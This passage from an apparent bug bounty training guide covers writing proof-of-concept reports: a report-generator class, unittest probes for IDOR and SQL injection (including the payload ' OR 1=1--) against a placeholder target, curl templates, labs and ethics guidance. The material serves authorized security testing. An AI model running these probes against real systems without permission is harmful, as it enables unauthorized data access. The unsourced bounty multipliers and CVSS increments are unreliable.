    
    def add_step(self, description, request, expected_response):
        """Add reproduction step"""
        self.steps.append({
            "description": description,
            "request": request,
            "expected": expected_response
        })
    
    def add_evidence(self, evidence_type, content, description):
        """Add supporting evidence"""
        self.evidence.append({
            "type": evidence_type,
            "content": content,
            "description": description
        })
    
    def generate_report(self):
        """Generate complete PoC report"""
        report = f"# PoC: {self.type}\n\n"
        
        # Steps
        report += "## Reproduction Steps\n\n"
        for i, step in enumerate(self.steps, 1):
            report += f"### Step {i}: {step['description']}\n\n"
            report += f"```bash\n{step['request']}\n```\n\n"
            report += f"**Expected Response:** {step['expected']}\n\n"
        
        # Evidence
        report += "## Evidence\n\n"
        for evidence in self.evidence:
            report += f"### {evidence['type']}\n\n"
            report += f"{evidence['description']}\n\n"
            report += f"```\n{evidence['content']}\n```\n\n"
        
        return report
```

#### Automated PoC Testing

```python
import unittest
import requests

class TestVulnerability(unittest.TestCase):
    def setUp(self):
        self.target = "https://target.com"
        self.session = requests.Session()
    
    def test_idor_exists(self):
        """Test for IDOR vulnerability"""
        # Authenticate
        self.session.post(
            f"{self.target}/api/auth/login",
            json={"email": "test@test.com", "password": "test123"}
        )
        
        # Access own profile
        own_response = self.session.get(
            f"{self.target}/api/users/123/profile"
        )
        
        # Access other user's profile
        other_response = self.session.get(
            f"{self.target}/api/users/456/profile"
        )
        
        # Verify IDOR exists
        self.assertEqual(own_response.status_code, 200)
        self.assertEqual(other_response.status_code, 200)
        self.assertNotEqual(own_response.json(), other_response.json())
    
    def test_sqli_exists(self):
        """Test for SQL injection"""
        # Test boolean-based
        response = self.session.get(
            f"{self.target}/api/search",
            params={"q": "' OR 1=1--"}
        )
        
        # Verify SQLi exists
        self.assertEqual(response.status_code, 200)
        self.assertGreater(len(response.text), 100)

if __name__ == "__main__":
    unittest.main()
```

## Detection

### PoC Effectiveness Detection

**Success Indicators**:
- Triager validates vulnerability within 24 hours
- No requests for additional information
- Immediate bounty processing
- Positive feedback from program manager
- Request to test additional related endpoints

**Improvement Indicators**:
- Requests for clarification on reproduction steps
- Questions about environment or prerequisites
- Requests for additional screenshots or video
- Severity disagreement discussions
- Scope clarification requests

### PoC Anti-Pattern Detection

**Weak PoC Signals**:
- Multiple rounds of clarification needed
- Triager cannot reproduce the issue
- Screenshots lack context or annotations
- Video is too long or unfocused
- Documentation is incomplete or unclear

**Strong PoC Signals**:
- One-step reproduction
- Clear visual evidence
- Complete documentation
- Professional presentation
- Minimal time to validate

## Impact

### PoC Impact on Triage Speed

| PoC Quality | Average Triage Time | Acceptance Rate |
|-------------|---------------------|-----------------|
| Minimal (curl only) | 3-5 days | 70% |
| Basic (curl + docs) | 2-3 days | 85% |
| Complete (full documentation) | 1-2 days | 95% |
| Advanced (automated) | < 24 hours | 99% |

### PoC Impact on Severity Assessment

Well-demonstrated impact can increase severity:

```
Demonstrated Impact Effects:
- Data exposure: +0.5 to +1.0 CVSS
- Authentication bypass: +1.0 to +2.0 CVSS
- Privilege escalation: +1.5 to +2.5 CVSS
- Chain exploitation: +2.0 to +3.0 CVSS
```

### PoC Impact on Bounty Determination

| PoC Quality | Bounty Multiplier |
|-------------|-------------------|
| Poor | 0.5x - 0.7x |
| Average | 1.0x (baseline) |
| Good | 1.1x - 1.3x |
| Excellent | 1.4x - 1.8x |
| Exceptional | 2.0x+ |

## Pitfalls

### Common PoC Mistakes

1. **Overcomplication**: Making PoC unnecessarily complex
2. **Missing context**: Not showing before/after states
3. **Poor documentation**: Unclear reproduction steps
4. **No screenshots**: Relying only on text descriptions
5. **Too long video**: Including irrelevant content
6. **Missing impact**: Not demonstrating real-world consequences
7. **Scope violation**: Testing outside authorized boundaries
8. **Data exposure**: Including real user data in PoC
9. **Tool dependencies**: Using tools triagers may not have
10. **Environment assumptions**: Assuming specific setup
11. **No error handling**: PoC fails silently
12. **Hardcoded values**: Using hardcoded tokens or IDs
13. **Missing timestamps**: No temporal context
14. **Unclear annotations**: Screenshots without highlights
15. **No version info**: Missing tool versions
16. **Incomplete steps**: Skipping important details
17. **Wrong format**: Not following program templates
18. **Late delivery**: Submitting PoC days after report
19. **No follow-up**: Not responding to triage questions
20. **Poor organization**: Disorganized files and screenshots
21. **Missing prerequisites**: Not documenting required setup
22. **Unclear impact**: Not quantifying business consequences
23. **No remediation**: Not suggesting fixes
24. **Wrong tool**: Using inappropriate tools for vulnerability
25. **No backup**: Not providing alternative reproduction methods

### Recovery from PoC Failures

**If Triager Cannot Reproduce**:
1. Verify target environment hasn't changed
2. Provide alternative reproduction method
3. Offer live demonstration if possible
4. Document exact environment details
5. Provide additional screenshots or video

**If PoC is Rejected**:
1. Request detailed feedback
2. Understand rejection reasons
3. Improve PoC based on feedback
4. Resubmit with enhancements
5. Consider alternative approaches

### Long-Term PoC Improvement

**Continuous Improvement Framework**:
1. Track PoC success rates
2. Analyze feedback patterns
3. Study successful PoCs from peers
4. Practice new techniques regularly
5. Update tooling and methodologies

## Integration

### Report Integration

**PoC as Report Component**:

```
Report Structure:
1. Title and Summary
2. Severity Assessment
3. Vulnerability Details
4. Steps to Reproduction ← PoC lives here
5. Impact Analysis
6. Remediation Recommendations
7. Supporting Materials ← PoC files here
```

**Seamless Integration**:
- Reference PoC steps in report body
- Link to supporting materials
- Include key screenshots inline
- Provide full PoC as attachment

### Workflow Integration

**PoC Development Workflow**:

```
Discovery → Analysis → Planning → Development → Testing → Documentation → Submission
    ↓           ↓          ↓           ↓           ↓           ↓              ↓
 Identify    Understand   Design     Write       Validate   Document      Submit
  Issue      Root Cause   Approach   Code        Results    Findings      Report
```

### Tool Integration

**Integrated PoC Environment**:

```
Development Tools → Testing Tools → Documentation Tools → Submission
     ↓                  ↓                  ↓                ↓
   Python          Burp Suite          Markdown          Platform
   Node.js         Postman           Screenshots        API
   Bash            Nuclei            Videos             Email
```

### Team Integration

**Collaborative PoC Development**:

```
Researcher → Reviewer → Documentation → Submission
    ↓           ↓            ↓              ↓
 Develop    Validate     Polish        Submit
  PoC       Results      Reports       Reports
```

## Reporting

### PoC Documentation Standards

**Minimum Documentation Requirements**:

```
Required Elements:
□ Vulnerability description
□ Affected endpoint/feature
□ Authentication requirements
□ Step-by-step reproduction
□ Request/response examples
□ Screenshots with annotations
□ Impact demonstration
□ Environment details
□ Tool versions
□ Timestamps
```

**Enhanced Documentation**:

```
Optional but Valuable:
□ Video walkthrough
□ Automated script
□ Multiple reproduction methods
□ Edge case demonstrations
□ Comparison with legitimate behavior
□ Remediation verification
□ Related vulnerability findings
```

### PoC Report Template

```markdown
# Proof of Concept: [Vulnerability Type]

## Overview
- **Vulnerability**: [Type]
- **Target**: [Endpoint/Feature]
- **Severity**: [CVSS Score]
- **Date Discovered**: [Date]
- **Researcher**: [Your Name]

## Prerequisites
- Authentication required: [Yes/No]
- Account type needed: [User/Admin/None]
- Special conditions: [Any prerequisites]

## Environment
- OS: [Operating System]
- Browser: [Browser and version]
- Tools: [Tool versions]
- Network: [Any special network requirements]

## Reproduction Steps

### Step 1: [Description]
```bash
curl -v 'https://target.com/api/endpoint' \
  -H 'Authorization: Bearer TOKEN'
```

**Expected Response:**
```json
{
  "status": "success",
  "data": {...}
}
```

**Screenshot:** [screenshot_01.png]

### Step 2: [Description]
[Continue for each step]

## Impact Demonstration
[Show maximum impact]

## Evidence
- Screenshots: [List files]
- Videos: [Links if applicable]
- Scripts: [List files]
- Logs: [Relevant logs]

## Notes
[Any additional information]
```

### Communication Templates

**PoC Submission Message**:

```
Subject: PoC Submission for Report #[ID]

Hi [Program Manager],

I've attached the complete Proof of Concept for my report regarding
[Vulnerability Type].

The PoC includes:
- Step-by-step reproduction instructions
- curl commands for immediate testing
- Screenshots with annotations
- Video walkthrough (optional)
- Automated script (if applicable)

Please let me know if you need any additional information or
if there are any issues reproducing the vulnerability.

Best regards,
[Your Name]
```

**Response to Reproduction Issues**:

```
Subject: Re: PoC Reproduction Assistance

Hi [Program Manager],

Thank you for attempting to reproduce. I understand there may be
some challenges. Let me provide additional context:

1. [Additional detail #1]
2. [Additional detail #2]
3. [Alternative method]

I've also attached [additional evidence] to help with validation.

Would it be helpful if I provided a live demonstration or
additional screenshots?

Best regards,
[Your Name]
```

## Labs

### Lab 1: Basic PoC Development

**Objective**: Create a complete PoC for a simple IDOR vulnerability

**Duration**: 2 hours

**Task**:
1. Identify IDOR in test application
2. Write curl command demonstrating vulnerability
3. Capture screenshots of before/after
4. Create 30-second video walkthrough
5. Document reproduction steps

**Deliverables**:
- curl PoC script
- Annotated screenshots
- Video file
- Documentation file

**Success Criteria**:
- Triager can reproduce without assistance
- All steps clearly documented
- Screenshots show clear impact
- Video demonstrates complete flow

### Lab 2: Complex PoC Development

**Objective**: Create automated PoC for race condition vulnerability

**Duration**: 4 hours

**Task**:
1. Identify race condition in test application
2. Develop Python script demonstrating vulnerability
3. Implement proper error handling
4. Add detailed documentation
5. Create comprehensive video

**Deliverables**:
- Python PoC script
- Requirements file
- Documentation
- Video demonstration
- Test results

**Success Criteria**:
- Script executes without errors
- Vulnerability clearly demonstrated
- Impact quantified
- Documentation complete

### Lab 3: PoC Documentation Workshop

**Objective**: Transform existing PoC into professional documentation

**Duration**: 2 hours

**Task**:
1. Select existing PoC from your work
2. Review and improve documentation
3. Add missing screenshots
4. Create clear reproduction steps
5. Peer review (if possible)

**Deliverables**:
- Improved PoC documentation
- Updated screenshots
- Clear reproduction guide
- Peer feedback (if available)

**Success Criteria**:
- Documentation follows template
- All steps unambiguous
- Screenshots properly annotated
- Ready for submission

### Lab 4: Video PoC Creation

**Objective**: Create professional video PoC for complex vulnerability

**Duration**: 3 hours

**Task**:
1. Plan video structure and narration
2. Set up recording environment
3. Record demonstration
4. Edit and enhance video
5. Add annotations and callouts

**Deliverables**:
- Video file (MP4)
- Script/narration
- Thumbnail
- Description

**Success Criteria**:
- Video clear and focused
- All steps visible
- Annotations helpful
- Length appropriate (2-5 minutes)

## Ethics

### Ethical PoC Development Principles

**Responsible Demonstration**:

1. **Minimize impact**: Use minimal necessary exploitation
2. **Avoid data exposure**: Don't access real user data
3. **Stay in scope**: Test only authorized endpoints
4. **Document everything**: Keep records of all testing
5. **Reversible actions**: Prefer demonstrations that can be undone

**Professional Standards**:

1. **Accuracy**: Ensure PoC accurately represents vulnerability
2. **Completeness**: Provide all necessary information
3. **Clarity**: Make reproduction steps unambiguous
4. **Timeliness**: Deliver PoC promptly with report
5. **Confidentiality**: Keep PoC confidential until disclosure

### Legal Considerations

**Authorization Framework**:

```
Authorized Activities:
- Testing within defined scope
- Using provided credentials
- Submitting reports through platform
- Documenting findings
- Communicating with program managers

Prohibited Activities:
- Accessing unauthorized data
- Modifying production data
- Disrupting services
- Sharing access credentials
- Public disclosure without consent
```

### Community Responsibility

**Positive Impact**:

1. **Knowledge sharing**: Share techniques responsibly
2. **Mentoring**: Help others improve PoC development
3. **Standards promotion**: Advocate for good practices
4. **Quality advocacy**: Push for better PoC standards
5. **Ethical leadership**: Demonstrate responsible practices

## Cheat Sheet

### PoC Development Quick Reference

**Decision Matrix**:

```
Simple Vulnerability → curl command + screenshots
Complex Vulnerability → Python script + video
Chain Exploitation → Automated script + documentation
Race Condition → Multi-threaded script + video
Business Logic → Step-by-step guide + screenshots
Authentication Bypass → Complete exploitation chain
```

**Essential curl Commands**:

```bash
# Basic GET
curl -v 'https://target.com/api/endpoint'

# POST with JSON
curl -v 'https://target.com/api/endpoint' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"key": "value"}'

# With Authentication
curl -v 'https://target.com/api/endpoint' \
  -H 'Authorization: Bearer TOKEN'

# Verbose with Response Body
curl -v 'https://target.com/api/endpoint' 2>&1 | tee response.txt
```

**Screenshot Checklist**:

```
□ URL bar visible
□ Request in Burp/DevTools
□ Response with evidence
□ Before/after comparison
□ Annotations added
□ Sensitive data redacted
□ High resolution
□ Descriptive filename
```

**Video Recording Checklist**:

```
□ Title card with details
□ Clear narration (optional)
□ All steps visible
□ URL bar shown
□ Timestamps included
□ Focused content
□ Appropriate length
□ Export as MP4
```

**Documentation Template**:

```markdown
# PoC: [Vulnerability Type]

## Summary
[One-paragraph overview]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Evidence
- Screenshots: [Files]
- Video: [Link]
- Scripts: [Files]

## Impact
[Business consequences]

## Environment
- Tool versions
- OS
- Browser
```

**Communication Templates**:

```
PoC Attached:
"Please find attached the complete PoC for report #[ID].
Let me know if you need any assistance reproducing."

Reproduction Help:
"I can provide additional context or alternative reproduction
methods if needed. Please let me know."

Severity Discussion:
"Based on the demonstrated impact in the PoC, I believe
[severity] is appropriate because [justification]."
```

**Quality Checklist**:

```
Pre-Submission:
□ PoC executes without errors
□ Results are reproducible
□ All steps documented
□ Screenshots annotated
□ Video clear and focused
□ Impact demonstrated
□ Scope compliant
□ Tool versions documented
□ Environment details recorded
□ Documentation complete
```

**Common Fixes**:

```
Triager Cannot Reproduce:
- Verify environment matches
- Provide alternative method
- Offer live demonstration
- Document exact setup
- Provide additional screenshots

PoC Too Complex:
- Simplify to essential steps
- Add clearer documentation
- Break into smaller parts
- Provide automation script
- Create video walkthrough

Impact Not Clear:
- Add business context
- Quantify potential damage
- Show real-world scenarios
- Compare with legitimate use
- Document data exposure
```

### Severity Quick Reference for PoCs

| PoC Evidence | Severity Impact |
|--------------|-----------------|
| Data exposure demonstrated | +1.0 CVSS |
| Authentication bypass shown | +1.5 CVSS |
| Privilege escalation proven | +2.0 CVSS |
| Complete compromise shown | +2.5 CVSS |
| Business logic bypass | +1.0 CVSS |
| Chain exploitation | +2.0 CVSS |
| Automation capability | +0.5 CVSS |
| Scale demonstration | +1.0 CVSS |
